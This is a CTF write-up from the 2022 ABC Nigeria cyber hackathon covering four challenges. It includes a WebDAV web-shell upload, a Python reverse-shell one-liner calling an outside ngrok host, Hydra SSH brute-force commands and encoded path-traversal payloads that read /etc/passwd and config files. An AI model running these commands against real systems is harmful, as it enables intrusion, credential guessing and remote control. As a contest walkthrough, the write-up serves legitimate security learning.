---
layout: default
title : n16hth4wk - abcccyberhackathon CTF 2022 Writeup
---

### CTF Overview

As part of the 2021 Cybersecurity Conference, the American Business Council Nigeria (ABC Nigeria) was Organized by NaijaSecForce in partnership with Private Sector partners are hosting a Cybersecurity Hackathon. The objective of the hackathon is to highlight the capacity in the space and show the importance of implementing a cybersecurity framework in Nigeria.

The Hackathon will award innovators for displaying their level of expertise and skills in developing solutions to cyber challenges. A Cyber Award will be allocated in kind and will be distributed among the top three winners. 

Cyber Awards will be awarded to the top three teams. Prices includes Laptops, Cybersecurity Certificates, Bootcamp for winners on Security in IBM Cloud, Cisco Certified CyberOps Associate Certifications for the Team Captains and Merchandise. The Award is sponsored by Cisco, IBM, Comercio and American Business Council.

### pwn challenges writeup by nighthawk

### Linux Method - 1000pts

![1](https://user-images.githubusercontent.com/87468669/194117552-e6e33a3e-ef89-44bd-8c3d-cf939fc8c058.png)

Hmmmm we got an IP and a port, let's us nmap to check and  know what service is running on that port.

```
┌──(n16hth4wk㉿n16hthawk-sec)-[~]
└─$ nmap -sC -sV  185.203.119.220 -p 8003  
Starting Nmap 7.92 ( https://nmap.org ) at 2022-10-05 09:54 CDT
Nmap scan report for 185.203.119.220 Host is up (0.20s latency).
PORT     STATE SERVICE VERSION
8003/tcp open  http    Apache httpd 2.4.52 ((Ubuntu))
|_http-title: Apache2 Ubuntu Default Page: It works
|_http-server-header: Apache/2.4.52 (Ubuntu)
Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 14.04 seconds
```

noice from our scan we can see that an http apache service is running on that port. let's check it on our browser

![2](https://user-images.githubusercontent.com/87468669/194118284-8c40afac-04bb-4eb0-8c17-4f49048db7b9.png)

sweet… let's check the source page if Muzec have anything for us

![3](https://user-images.githubusercontent.com/87468669/194118623-cf2c96ff-0d32-412a-9735-2ace7305c990.png)

hmmmm… abcctf should help in our journey you say. 🤔

let's burst hidden directory with ffuf

```
┌──(n16hth4wk㉿n16hthawk-sec)-[~/abcctf/method]
└─$ ffuf -u "http://185.203.119.220:8003/FUZZ" -w /usr/share/seclists/Discovery/Web-Content/common.txt -e .php,.txt,.phtml,.bak,.sh -fs 282 

        /'___\  /'___\           /'___\       
       /\ \__/ /\ \__/  __  __  /\ \__/       
       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\      
        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/      
         \ \_\   \ \_\  \ \____/  \ \_\       
          \/_/    \/_/   \/___/    \/_/       

       v1.5.0 Kali Exclusive <3
________________________________________________

 :: Method           : GET
 :: URL              : http://185.203.119.220:8003/FUZZ
 :: Wordlist         : FUZZ: /usr/share/seclists/Discovery/Web-Content/common.txt
 :: Extensions       : .php .txt .phtml .bak .sh 
 :: Follow redirects : false
 :: Calibration      : false
 :: Timeout          : 10
 :: Threads          : 40
 :: Matcher          : Response status: 200,204,301,302,307,401,403,405,500
 :: Filter           : Response size: 282
________________________________________________

_backup                 [Status: 301, Size: 327, Words: 20, Lines: 10, Duration: 202ms]
index.html              [Status: 200, Size: 10772, Words: 3544, Lines: 369, Duration: 166ms]
webdav                  [Status: 401, Size: 464, Words: 42, Lines: 15, Duration: 167ms]
wordpress               [Status: 301, Size: 329, Words: 20, Lines: 10, Duration: 163ms]
:: Progress: [28278/28278] :: Job [1/1] :: 95 req/sec :: Duration: [0:02:46] :: Errors: 22 ::
```

nice we got somethings interesting but trust me you'll only want to take a look at the webdav directory. cause our sharingan 👀 saw through it that the rest was a rabbit hole 😂, like Itachi saying "sono sharingan 👀 omaewa doko made mieteiru" 

![4](https://user-images.githubusercontent.com/87468669/194121126-27a27eea-fa0f-4182-a088-adcd2572aaa4.png)

hmmmmmm... We are asked to login 😬. but hope you did not forget what Muzec-san left for us in the default apache web source page "abcctf should help you in your journey...." 😉, so let's try login with username: abcctf and password:abcctf.

![image](https://user-images.githubusercontent.com/87468669/194122426-a83ae6f3-4847-462b-a515-a4194cc97c7b.png)

Boom! we are in and we can see the file nothing.txt... let's check its content

![image](https://user-images.githubusercontent.com/87468669/194123641-6ce5f4a2-ed4d-48b6-b238-c3ec8eb48f98.png)

lol nothing really???? let's scroll down to the bottom of the page

![image](https://user-images.githubusercontent.com/87468669/194123866-9fd5e243-27f0-498c-a974-6cfc1dc925f2.png)

there's a piece of advice to prevent other players from either gaining access with your shell or get hint from it 😉.
Now we know it's running webdav, let's exploit our way and gain reverse shell. in this process we would be using cadaver to upload our shell then get a reverse shell shell. 

```
┌──(n16hth4wk㉿n16hthawk-sec)-[~/abcctf/method]
└─$ cadaver http://185.203.119.220:8003/webdav/
Authentication required for webdav on server `185.203.119.220':
Username: abcctf
Password: 
dav:/webdav/> put shell.php
Uploading shell.php to `/webdav/shell.php':
Progress: [=============================>] 100.0% of 348 bytes succeeded.
dav:/webdav/> ls
Listing collection `/webdav/': succeeded.
        nothing.txt                          374  Oct  2 22:37
        shell.php                            348  Oct  5 12:42
dav:/webdav/> 

```

we did that now let's check back the webpage to see our shell 

![image](https://user-images.githubusercontent.com/87468669/194126637-3fd3164f-2b79-4724-9a26-c1839c539120.png)

great we can execute some commands on the shell we uploaded

![image](https://user-images.githubusercontent.com/87468669/194126743-bb62ec9f-8cff-43c3-a430-d396f391a395.png)

Now let get a reverse shell using ngrok.

![image](https://user-images.githubusercontent.com/87468669/194126878-06588b8b-f61b-4b65-8f38-3e4a0aa10846.png)

ping our ngrok.io to get an ip address
```
┌──(n16hth4wk㉿n16hthawk-sec)-[~/abcctf/method]
└─$ ping -c 2 2.tcp.eu.ngrok.io
PING 2.tcp.eu.ngrok.io (3.126.37.18) 56(84) bytes of data.
64 bytes from 3.126.37.18 (3.126.37.18): icmp_seq=1 ttl=234 time=160 ms
64 bytes from 3.126.37.18 (3.126.37.18): icmp_seq=2 ttl=234 time=146 ms

--- 2.tcp.eu.ngrok.io ping statistics ---
2 packets transmitted, 2 received, 0% packet loss, time 1001ms
rtt min/avg/max/mdev = 145.905/152.805/159.706/6.900 ms

```
ncat listener ready

![image](https://user-images.githubusercontent.com/87468669/194132884-d3427e33-34de-4291-a5fc-5ecdbc8c12a7.png)

reverse shell payload 
```
python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("3.126.37.18",18416));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty; pty.spawn("sh")'
```

![image](https://user-images.githubusercontent.com/87468669/194127758-cb433e30-7425-45a6-8d5d-f8cac0fd0ca2.png)

Checking our ncat listener, Boom! we got a shell 😅

![image](https://user-images.githubusercontent.com/87468669/194127891-58614c0b-9f2b-4c9c-883a-99f5e08fa298.png)

let's stabilize the shell and escalate priv to root. by just doing su root and password:toor gave us the root shell

![image](https://user-images.githubusercontent.com/87468669/194134825-2b1842db-c10c-41b2-a779-a2ebcb09da87.png)

Now hunting for the flag, i did ```find / 2>/dev/null | grep -i "flag"```


![image](https://user-images.githubusercontent.com/87468669/194135145-6a7f239b-d41e-43b6-9782-be818e78c9f1.png)

final flag - abcctf{345Y_r007_W17H_D3F4U17_Cr3D5}

sweet challenge from Muzec-san.

### Pain - 1500pts

![image](https://user-images.githubusercontent.com/87468669/194135616-d4c951a1-204b-42e9-a84a-656671c6c53f.png)

We got 2 IPs and ports again this really will be Pain 💉💉💉. Regardless we move. As we can see the first IP is an http server, let's use nmap to check and know what service is running on that port 2222.

```
┌──(n16hth4wk㉿n16hthawk-sec)-[~/abcctf/Pain]
└─$ nmap -sC -sV  185.203.119.220 -p 2222  
Starting Nmap 7.92 ( https://nmap.org ) at 2022-10-05 13:38 CDT
Nmap scan report for 185.203.119.220
Host is up (0.67s latency).

PORT     STATE SERVICE VERSION
2222/tcp open  ssh     OpenSSH 8.9p1 Ubuntu 3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   256 f3:c8:21:9a:27:8e:62:7c:be:5c:31:0b:d8:bf:46:86 (ECDSA)
|_  256 45:74:d1:d7:94:a7:a6:b3:12:4b:91:7f:6e:a5:e0:4a (ED25519)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 9.43 seconds
```

Nice we now know port 2222 is an ssh port, so let's go back to the first IP which is a an http web server 

![image](https://user-images.githubusercontent.com/87468669/194166210-d862130f-5678-4260-b308-ad6179b5f481.png)

so we have the web service open and all the quotes here are about pain💉💉💉. But regardless we've got magekyou sharingan 😂 😂. we either put this challenge under Genjutsu or Izanami 😂. Enough with that let's move on.

![image](https://user-images.githubusercontent.com/87468669/194230661-16ebbca9-c9d7-4cec-b830-7ec2573c3d00.png)

Checking the source page, got nothing this is where our sharingan aka ffuf fuzzer for us burst hidden directories

```
┌──(n16hth4wk㉿n16hthawk-sec)-[~]
└─$ ffuf -u "http://185.203.119.220:8080/FUZZ" -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt -e .bak,.txt,.php,.sql,.sh,.phtml,.tar -fs 582

        /'___\  /'___\           /'___\       
       /\ \__/ /\ \__/  __  __  /\ \__/       
       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\      
        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/      
         \ \_\   \ \_\  \ \____/  \ \_\       
          \/_/    \/_/   \/___/    \/_/       

       v1.5.0 Kali Exclusive <3
________________________________________________

 :: Method           : GET
 :: URL              : http://185.203.119.220:8080/FUZZ
 :: Wordlist         : FUZZ: /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt
 :: Extensions       : .bak .txt .php .sql .sh .phtml .tar 
 :: Follow redirects : false
 :: Calibration      : false
 :: Timeout          : 10
 :: Threads          : 40
 :: Matcher          : Response status: 200,204,301,302,307,401,403,405,500
 :: Filter           : Response size: 582
________________________________________________

pain.bak                [Status: 200, Size: 108, Words: 1, Lines: 17, Duration: 173ms]
pain.txt                [Status: 200, Size: 22, Words: 4, Lines: 2, Duration: 170ms]
```

Cool we can see two directories here, let's check em out. pain.bak is a downloadable file so let's download it 

![image](https://user-images.githubusercontent.com/87468669/194245782-5b474ad0-0a3c-4d33-93ab-83d88e877313.png)

let's go and check pain.txt on our browser

![image](https://user-images.githubusercontent.com/87468669/194233891-dc47fa2f-23e9-45cc-9fdb-5dc45d0c4a84.png)

Maybe secret in LEET. 🤔 🤔 🤔 niisan what do you mean here... anyways let's check the content of pain.bak

```
┌──(n16hth4wk㉿n16hthawk-sec)-[~/abcctf/Pain]
└─$ cat pain.bak                                                                             
root
pain
aaliyah
aaren
aarika
aaron
aartjan
aarushi
abagael
abagail
abahri
abbas
muzec
abcctf
R4T
rudefish

```
pain.bak contains somenames, why don't use hydra to try out this names on ssh if any would work 

![image](https://user-images.githubusercontent.com/87468669/194253794-e4090913-7f87-46c3-a2dc-a3c0d0863caf.png)

Boom! we got a username and password for ssh. command used ```hydra -s 2222 -L pain.bak -P pain.bak 185.203.119.220 ssh```

let's login ssh with the username and password found above

![image](https://user-images.githubusercontent.com/87468669/194261568-c335a08c-f9db-4b23-993f-03bf69f05e4d.png)

We are in now let's escalate privs to root. 

![image](https://user-images.githubusercontent.com/87468669/194264733-8afe4439-5369-49dd-a1af-06293edaa3d3.png)

Broooo i got stucked here for hours, and i was running out of chakra 😂 😂... i stared at the "Maybe secret in LEET." for hours omo nothing, i tried su rudefish with password secret omo e no work, su muzec with password secret still the same, i tried secret in leet for (53cr37, 53CR37...) none worked. I was like omo this is truly pain. i used my last resort susano 😂. i looked at the pain.bak again and said why don't i try bruteforce muzec or rudefish password for ssh but in another format. 
Let's try it in reverse format. sitelink: ```https://www.textreverse.com/```

![image](https://user-images.githubusercontent.com/87468669/194272097-e4e7d740-4151-4b4c-ab23-35763dcd69bd.png)

click on reverse you should get the reverse form of the words 

![image](https://user-images.githubusercontent.com/87468669/194272466-4c5699c5-7758-4fb4-b2cf-4c54edb221b5.png)

```
hsifedur
T4R
ftccba
cezum
sabba
irhaba
liagaba
leagaba
ihsuraa
najtraa
noraa
akiraa
neraa
hayilaa
niap
toor
```
now let's copy them and put the in a file. then we use hydra to bruteforce again this time we are using the reversed wordlist 

![image](https://user-images.githubusercontent.com/87468669/194273848-e6d6d3ee-ee71-441f-be7f-4f7770e4f1f8.png)

Boom! we got the password for muzec, i did the same for rudefish but trust me you don't want to be trolled 😂 after coming this far.
su muzec with password: cezum

![image](https://user-images.githubusercontent.com/87468669/194276461-7bb7f50c-ec64-4c5b-8a91-dbde5e617399.png)

we are in let's escalate privs to root.

![image](https://user-images.githubusercontent.com/87468669/194276932-a013f088-ae27-4378-9b7f-7200192d5c88.png)

```
muzec@3470e9a4bace:~$ sudo -l
muzec@3470e9a4bace:~$ which sudo
/usr/bin/sudo
muzec@3470e9a4bace:~$ /usr/bin/sudo -l
[sudo] password for muzec: 
Matching Defaults entries for muzec on 3470e9a4bace:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin,
    use_pty

User muzec may run the following commands on 3470e9a4bace:
    (ALL : ALL) ALL
muzec@3470e9a4bace:~$ /usr/bin/sudo su
root@3470e9a4bace:/home/muzec# 
root@3470e9a4bace:/home/muzec# 

```
The reason i used the full path of sudo was because Musec changed the alias so we would pass through pain in getting the flag the same way 😂. if you check the bashrc file you will see alias sudo=/bin/true, it's the same for cat too.
Now we are root let's hunt for the flag.

![image](https://user-images.githubusercontent.com/87468669/194278486-52823a44-af76-4b68-b3bc-7fe5002dd8d9.png)

there we have our flag

Final Flag :- abcctf{HYDr4_r3V3r53_15_C001_r16H7}


#### Easy LFI - 1000pts

![image](https://user-images.githubusercontent.com/87468669/194280310-0bbc3849-329d-443c-8965-bd59682dfffb.png)

We got an IP and a port, let's use nmap to check and know what service is running on that port.

```
┌──(n16hth4wk㉿n16hthawk-sec)-[~/abcctf/Easy]
└─$ nmap -sC -sV 185.203.119.220 -p8002                                         
Starting Nmap 7.92 ( https://nmap.org ) at 2022-10-06 05:24 CDT
Nmap scan report for 185.203.119.220
Host is up (0.21s latency).

PORT     STATE SERVICE VERSION
8002/tcp open  http    Apache httpd 2.4.52 ((Ubuntu))
|_http-server-header: Apache/2.4.52 (Ubuntu)
|_http-title: Apache2 Ubuntu Default Page: It works

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 29.79 seconds

```

Good from our scan we can see that an http apache service is running on that port. let's check it on our browser

![image](https://user-images.githubusercontent.com/87468669/194290082-6c286b16-42e7-4b2d-84aa-79073b4a7ed2.png)

nice. Let's check the page source 

![image](https://user-images.githubusercontent.com/87468669/194290338-577e86e1-7031-4f5a-9bdd-176155dfb1b8.png)

hmmmm Muzec-san has started again 😂... what does "easy like abcdef123456" mean 🤔🤔

Let's burst open hidden directiories 

```
┌──(n16hth4wk㉿n16hthawk-sec)-[~/abcctf/Easy]
└─$ ffuf -u "http://185.203.119.220:8002/FUZZ" -w /usr/share/seclists/Discovery/Web-Content/common.txt -e .txt,.php,.bak,sh -fs 282

        /'___\  /'___\           /'___\       
       /\ \__/ /\ \__/  __  __  /\ \__/       
       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\      
        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/      
         \ \_\   \ \_\  \ \____/  \ \_\       
          \/_/    \/_/   \/___/    \/_/       

       v1.5.0 Kali Exclusive <3
________________________________________________

 :: Method           : GET
 :: URL              : http://185.203.119.220:8002/FUZZ
 :: Wordlist         : FUZZ: /usr/share/seclists/Discovery/Web-Content/common.txt
 :: Extensions       : .txt .php .bak sh 
 :: Follow redirects : false
 :: Calibration      : false
 :: Timeout          : 10
 :: Threads          : 40
 :: Matcher          : Response status: 200,204,301,302,307,401,403,405,500
 :: Filter           : Response size: 282
________________________________________________

help.txt                [Status: 200, Size: 181, Words: 29, Lines: 5, Duration: 171ms]
index.html              [Status: 200, Size: 10697, Words: 3502, Lines: 364, Duration: 190ms]
:: Progress: [23565/23565] :: Job [1/1] :: 95 req/sec :: Duration: [0:02:21] :: Errors: 16 ::

```

good we got help.txt, let's browse that 

![image](https://user-images.githubusercontent.com/87468669/194295365-020872b1-60a0-42d2-a57d-b4ef00159ecd.png)
```
Welcome L33T Hacker, we need your help in fixing a missing directory D1r3C70XXX eaten by R4T.
The eaten part is XXX.
we wish you the best of luck you l33t hacker.
```
Naani!!! R4T ate what ??? 😂  nooo nau don't tell me this we go fight. But no need for large vawulence for now, let's save it for later.
let's create a wordlist with 3 characters for XXX so as to get the remaining 3 charaters that was eaten. remember what Muzec-san left for us in the page source earlier "easy like abcdef123456". so let's create a wordlist with that hint 

```
┌──(n16hth4wk㉿n16hthawk-sec)-[~/abcctf/Easy]
└─$ crunch 3 3 abcdef123456  -o cruched.txt
Crunch will now generate the following amount of data: 6912 bytes
0 MB
0 GB
0 TB
0 PB
Crunch will now generate the following number of lines: 1728 

crunch: 100% completed generating output

```

Now we've generated a wordlist, let's fuzz for the remaining part of the directory R4T sama ate.

```
┌──(n16hth4wk㉿n16hthawk-sec)-[~/abcctf/Easy]
└─$ ffuf -u "http://185.203.119.220:8002/D1r3C70FUZZ" -w cruched.txt

        /'___\  /'___\           /'___\       
       /\ \__/ /\ \__/  __  __  /\ \__/       
       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\      
        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/      
         \ \_\   \ \_\  \ \____/  \ \_\       
          \/_/    \/_/   \/___/    \/_/       

       v1.5.0 Kali Exclusive <3
________________________________________________

 :: Method           : GET
 :: URL              : http://185.203.119.220:8002/D1r3C70FUZZ
 :: Wordlist         : FUZZ: cruched.txt
 :: Follow redirects : false
 :: Calibration      : false
 :: Timeout          : 10
 :: Threads          : 40
 :: Matcher          : Response status: 200,204,301,302,307,401,403,405,500
________________________________________________

64a                     [Status: 301, Size: 330, Words: 20, Lines: 10, Duration: 160ms]
:: Progress: [1728/1728] :: Job [1/1] :: 237 req/sec :: Duration: [0:00:11] :: Errors: 0 ::

```
Cool we got the remaining part of the Directory, let's check it out on our browser

![image](https://user-images.githubusercontent.com/87468669/194636120-b3c25bfe-f5fe-4d90-a7fe-a5424ab78547.png)

we got it nice let's play around 

![image](https://user-images.githubusercontent.com/87468669/194636854-f28dae8c-c414-4e59-a400-7e8502fad925.png)

clicked on the aboutus and got nothing... 🤔🤔🤔 but th path looks sus, so let's fuzz for lfi 

![image](https://user-images.githubusercontent.com/87468669/194637325-9f5ea69a-5746-4eab-991f-9838db0c6d78.png)

Hai hai wee got so many payload but we will only use th highlighted payload 
```/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/etc/passwd```

![image](https://user-images.githubusercontent.com/87468669/194637603-d9537bef-34a3-4119-99f9-17e2c9aa6e44.png)

Sweeeeeeii... we got lfi, let's hunt for the flag

![image](https://user-images.githubusercontent.com/87468669/194637800-901e0659-6e5c-4a40-a400-34e16b9a0db8.png)

payload used: ```/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/root/flag.txt```
checked /root directory for the flag but we got trolled by Muzec-san, but he directed us to the location where we can get the flag. ("Lost in one of the Apache config files sorry bro (:XD "). what next? let's create a wordlist containing apache config files

![image](https://user-images.githubusercontent.com/87468669/194638867-3fca339f-4fbe-4cc8-9919-eadc598156d6.png)

now we are done with the wordlist, let's fuzz

```
┌──(n16hth4wk㉿n16hthawk-sec)-[~/abcctf/Easy]
└─$ ffuf -u "http://185.203.119.220:8002/D1r3C7064a/index.php?abcctf=/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/FUZZ" -w apache.txt -fl 15

        /'___\  /'___\           /'___\       
       /\ \__/ /\ \__/  __  __  /\ \__/       
       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\      
        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/      
         \ \_\   \ \_\  \ \____/  \ \_\       
          \/_/    \/_/   \/___/    \/_/       

       v1.5.0 Kali Exclusive <3
________________________________________________

 :: Method           : GET
 :: URL              : http://185.203.119.220:8002/D1r3C7064a/index.php?abcctf=/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/FUZZ
 :: Wordlist         : FUZZ: apache.txt
 :: Follow redirects : false
 :: Calibration      : false
 :: Timeout          : 10
 :: Threads          : 40
 :: Matcher          : Response status: 200,204,301,302,307,401,403,405,500
 :: Filter           : Response lines: 15
________________________________________________

/etc/apache2/sites-enabled/000-default.conf [Status: 200, Size: 1865, Words: 275, Lines: 47, Duration: 394ms]
/etc/apache2/sites-available/default-ssl.conf [Status: 200, Size: 6804, Words: 944, Lines: 149, Duration: 394ms]
/etc/apache2/sites-available/000-default.conf [Status: 200, Size: 1865, Words: 275, Lines: 47, Duration: 402ms]
:: Progress: [8/8] :: Job [1/1] :: 0 req/sec :: Duration: [0:00:00] :: Errors: 0 ::

```

Let's try them out 

![image](https://user-images.githubusercontent.com/87468669/194639722-0f93ac44-97bf-43bb-89b3-a9702d770043.png)

payload used: ```/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/etc/apache2/sites-enabled/000-default.conf```

There we got the flag 

Final Flag :- abcctf{0N3_11N3r_845H_70_63N3r473_D1r3C70rY_70_1F1}

Nice challenge from Muzec-niisan 😉😉


### ReverseAPK - 250

![image](https://user-images.githubusercontent.com/87468669/194647190-1358b194-a714-418a-b97e-509224dda4dc.png)

Download the ABCCTF.apk file 

![image](https://user-images.githubusercontent.com/87468669/194648014-b3ab9997-8840-4f66-a17d-d1128f9b92e4.png)

extract the file 

![image](https://user-images.githubusercontent.com/87468669/194648847-aa532735-c2c9-4003-a09a-f0a73d56f55f.png)

view the extracted files 

![image](https://user-images.githubusercontent.com/87468669/194649034-dcbb3392-a9bf-40fd-b5ed-14d660ef481f.png)

cat the AndroidManifest.xml file

![image](https://user-images.githubusercontent.com/87468669/194649230-16698369-9102-4dad-b98a-28f972e8ca8a.png)

copy the characters in secret: "21 22 23 23 34 26 3B 32 73 16 73 32 75 73 1F 74 10 0B 3D" and then decode the ascii characters

![image](https://user-images.githubusercontent.com/87468669/194649364-28255250-c59d-4e5f-a56c-a4baa5fd9fb5.png)

There we have our flag

Final Flag :- abcctf{r3V3r53_4PK}
